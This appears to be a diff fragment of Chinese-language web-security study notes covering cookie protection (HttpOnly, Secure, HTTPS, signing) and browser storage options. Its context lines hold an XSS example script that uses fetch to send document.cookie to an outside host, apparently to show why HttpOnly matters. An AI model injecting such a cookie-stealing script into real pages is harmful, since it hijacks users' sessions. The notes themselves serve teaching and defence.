@@ -5,12 +5,12 @@
         fetch('http://wwww.haike.com?cookie='+document.cookie)
     </script>
 
-    http only
+    // http only
 
-    - 更安全？
-        https
-        Secure 更加安全 非HTTPS连接发送cookie
-        签名 
+    // - 更安全？
+    //     https
+    //     Secure 更加安全 非HTTPS连接发送cookie
+    //     签名 
 // - localStorage/sessionStorage 5MB
 // - indexedDB 前端数据库 更大 支持复杂操作 事务
 // - service worker 离线存储
